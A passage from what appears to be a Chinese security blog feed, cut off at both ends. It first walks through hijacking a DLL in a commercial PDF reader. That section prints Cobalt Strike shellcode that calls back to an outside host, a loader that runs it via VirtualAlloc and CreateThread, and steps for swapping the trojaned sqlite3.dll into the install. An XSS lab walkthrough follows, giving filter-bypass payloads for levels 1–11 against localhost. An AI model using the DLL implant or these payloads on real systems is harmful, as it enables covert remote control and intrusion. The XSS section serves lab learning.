alt="在这里插入图片描述"></p><h2 id="aheadlib工具劫持"><a href="#aheadlib工具劫持" class="headerlink" title="aheadlib工具劫持"></a>aheadlib工具劫持</h2><p>这里演示程序为极速pdf<br><a href="https://jisupdf.com/">https://jisupdf.com/</a><br>安装好有得到如下文件<br><img src="https://img-blog.csdnimg.cn/464b9c9550a3464ab0483cf3b98b821e.png" alt="在这里插入图片描述"><br>这里先用cobalt strike生成payload<br><img src="https://img-blog.csdnimg.cn/45c971d6729343f683e3d270852d2232.png" alt="在这里插入图片描述"><br>设置好监听，然后生成<br><img src="https://img-blog.csdnimg.cn/de53f4355dfe46fbb97c5f25430d4582.png" alt="在这里插入图片描述"><br>打开工具aheadlib,然后这里以sqlite3.dll为例<br><img src="https://img-blog.csdnimg.cn/f864defc370d466ba8b8885d1f7ddd7c.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fc11f7b403de45ef9bd2648ad4d9081b.png" alt="在这里插入图片描述"><br>然后就会生成一个cpp文件<br>新建一个dll项目<br><img src="https://img-blog.csdnimg.cn/8f330a80b59743bebea3907a7c0ce0fa.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/38264e83c80a443fb7122cfebe49f26d.png" alt="在这里插入图片描述"><br>将生成的cpp文件覆盖到dllmain.cpp文件中<br><img src="https://img-blog.csdnimg.cn/5124b2bd7e934d0b98efafe0e1e9faa2.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/700b84416cc34ec3b780831fab2b1cdd.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>unsigned char buf[] = <span class="hljs-string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x74\x47\x39\x68\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x41\x55\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x35\x33\x2e\x34\x36\x00\x00\x00\x00\x00&quot;</span>;<br>void *<span class="hljs-built_in">exec</span> = VirtualAlloc(0,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);<br>memcpy(<span class="hljs-built_in">exec</span>,buf,sizeof(buf));<br>CreateThread(0, 0, (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">exec</span>, 0, 0, 0);//创建线程运行shellcode<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d5f62eb7ed3b43d5babe73956e0d98de.png" alt="在这里插入图片描述"><br>然后生成文件<br>将生成的dll文件和原dll文件进行替换<br><img src="https://img-blog.csdnimg.cn/0895761ec881414ab1e1221d36a22602.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f80cbabc39714bd8b52544125348e0fe.png" alt="在这里插入图片描述"><br>注意payload的位数要和生产dll文件的位数一致</p><p>参考链接：<a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>dll劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss靶场练习</title>
    <link href="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>- Pass-1</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/xss/level1.php?name=&lt;script&gt;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1f8db8aa925a4080bf0d8fb0ae1db8c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过<br><strong>- Pass-2</strong><br>直接插入不行，引号将其包裹起了<br><img src="https://img-blog.csdnimg.cn/ed782acfbb184dc7a21481d7ea0e0e46.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">http:<span class="hljs-comment">//127.0.0.1/xss/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;--</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/860786c3a44e4e63a264ee118f1f8c36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-3</strong><br>审查元素看看<br><img src="https://img-blog.csdnimg.cn/aa00ae981b8445ed9b2547212cc4870a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看似和2没啥区别 但与level2不同的是，value做了校验，双引号和尖括号都被校验了<br>可以集合单引号和事件来触发</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">‘ onclick=<span class="hljs-string">&#x27;alert(1)</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/93bd7072e7e345baa164cdd6a95d13fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><strong>- Pass-4</strong><br><img src="https://img-blog.csdnimg.cn/b0b677dd1e9942c59e9a9c2375b61d40.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到对&lt; &gt;进行了过滤<br>由下图可以看出是双引号包裹得<br><img src="https://img-blog.csdnimg.cn/4b271fbaba1d476f827d704a359afd3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/11cce687faa54f9598dea121e846d1dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-5</strong><br><img src="https://img-blog.csdnimg.cn/e1f2a65dcaf24c0e8b68d1158d7fec54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>对script进行了过滤<br>看了下还是双引号包裹<br><img src="https://img-blog.csdnimg.cn/594cdb06b0ee4512a4c6727032c24389.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>过滤了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d3bc3678eb1343d2b3bae1010789cba4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看手源码<br><img src="https://img-blog.csdnimg.cn/16bc20b21ddb418cbf3a8805f97d8d49.png" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;  </span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2d1c3438c1414aed9ef8a8dd3e78b31f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-6</strong><br>过滤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><p>可大小写绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/98191544e8c347538a55c5d238d3bbf1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-7</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str =<span class="hljs-built_in">strtolower</span>( $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8ab3b7d236bc440f8a4201bcb15a4a40.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-8</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br></code></pre></td></tr></table></figure><p>绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c51c6a21c5864a8a874cd843d5b7d8da.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-9</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br>echo <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span>您的链接不合法？有没有！<span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span><span class="hljs-string">&#x27;.$str7.&#x27;</span><span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="hljs-string">&lt;?php </span><br><span class="hljs-string">echo &quot;</span>&lt;h3 align=center&gt;payload的长度:<span class="hljs-string">&quot;.strlen($str7).&quot;</span>&lt;/h3&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/176725823c924c408925522c0142e34c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-10</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br>&lt;?php <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>从代码中可以看到是有几个隐藏参数的如下构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/xss/level10.php?name=1&amp;keyword=1&amp;t_sort=%22type=%22text%22%20onclick=%22alert(1)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/bd82752d29a44cddab5dd9ad4de761d6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-11</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 